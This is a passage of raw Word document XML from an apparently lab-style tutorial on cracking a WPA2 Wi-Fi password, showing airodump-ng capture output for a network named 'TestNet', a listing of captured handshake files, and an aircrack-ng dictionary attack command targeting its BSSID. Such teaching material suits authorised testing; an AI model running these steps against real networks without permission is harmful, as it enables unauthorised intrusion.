    <w:p w14:paraId="04A3338D" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03FD5F73" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A436D3C" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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00:19:5B:52:AD:F7  -33 100     1338       99    0  10  54   WPA2 CCMP   PSK  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>TestNet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C261F2" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7734883B" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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BSSID              STATION            PWR   Rate   Lost  Packets  Probe                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355B416F" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08EA1EDD" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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00:19:5B:52:AD:F7  00:1C:BF:90:5B:A3  -27  54-54      0      230 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18AEA81B" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="00031C10" w:rsidRDefault="008274A1" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Stop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and make sure the files were created properly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F73C08A" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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FF0000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>root@bt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">:/# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2* -al</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16AE58D5" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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lastRenderedPageBreak/>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>rw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">-r--r-- 1 root </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> 35189 2009-02-21 13:04 /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>/wpa2-01.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3992B008" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>rw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">-r--r-- 1 root </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   476 2009-02-21 13:04 /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>/wpa2-01.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B77F5C7" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>rw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">-r--r-- 1 root </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">   590 2009-02-21 13:04 /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>/wpa2-01.kismet.csv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233ED368" w14:textId="77777777" w:rsidR="008238FB" w:rsidRDefault="008238FB"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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AEC4250" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="003112DC" w:rsidRDefault="008274A1"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –w </w:t>
      </w:r>
      <w:r w:rsidR="007A2212" w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007A2212" w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007A2212" w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/share/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007A2212" w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007A2212" w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007A2212" w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>craclib</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007A2212" w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-small</w:t>
      </w:r>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -b 00:19:5B:52:AD:F7 /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003112DC">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2*.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B8E787" w14:textId="77777777" w:rsidR="00A67461" w:rsidRPr="008274A1" w:rsidRDefault="00A67461" w:rsidP="008274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20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5497189B" w14:textId="77777777" w:rsidR="0040213D" w:rsidRDefault="0040213D" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4397E819" w14:textId="77777777" w:rsidR="0040213D" w:rsidRDefault="0040213D" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35AFCF3D" w14:textId="77777777" w:rsidR="0040213D" w:rsidRDefault="0040213D" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FA35849" w14:textId="10257C32" w:rsidR="00CA5635" w:rsidRDefault="00CA5635" w:rsidP="007A2212">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0166D93F" w14:textId="77777777" w:rsidR="000E710F" w:rsidRDefault="000E710F" w:rsidP="007A2212">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61A9001B" w14:textId="77777777" w:rsidR="000E710F" w:rsidRDefault="000E710F" w:rsidP="007A2212">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B75EAD2" w14:textId="77777777" w:rsidR="000E710F" w:rsidRDefault="000E710F" w:rsidP="007A2212">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65BE4584" w14:textId="77777777" w:rsidR="000E710F" w:rsidRDefault="000E710F" w:rsidP="007A2212">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F7DC0E1" w14:textId="77777777" w:rsidR="000E710F" w:rsidRDefault="000E710F" w:rsidP="007A2212">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="265D4F1B" w14:textId="77777777" w:rsidR="000E710F" w:rsidRDefault="000E710F" w:rsidP="007A2212">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64B090B4" w14:textId="77777777" w:rsidR="000E710F" w:rsidRDefault="000E710F" w:rsidP="007A2212">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64AC37AF" w14:textId="77777777" w:rsidR="000E710F" w:rsidRDefault="000E710F" w:rsidP="007A2212">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FCE63B5" w14:textId="77777777" w:rsidR="001A4FDA" w:rsidRDefault="001A4FDA" w:rsidP="001A4FDA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BD3E414" w14:textId="77777777" w:rsidR="001A4FDA" w:rsidRDefault="001A4FDA" w:rsidP="001A4FDA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AE1BE7E" w14:textId="77777777" w:rsidR="001A4FDA" w:rsidRDefault="001A4FDA" w:rsidP="001A4FDA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6155987A" w14:textId="77777777" w:rsidR="001A4FDA" w:rsidRDefault="001A4FDA" w:rsidP="001A4FDA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BC75CB5" w14:textId="77777777" w:rsidR="001A4FDA" w:rsidRDefault="001A4FDA" w:rsidP="001A4FDA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A3C642C" w14:textId="77777777" w:rsidR="001A4FDA" w:rsidRDefault="001A4FDA" w:rsidP="001A4FDA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19DBAC5A" w14:textId="77777777" w:rsidR="001A4FDA" w:rsidRDefault="001A4FDA" w:rsidP="001A4FDA">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
    </w:p>
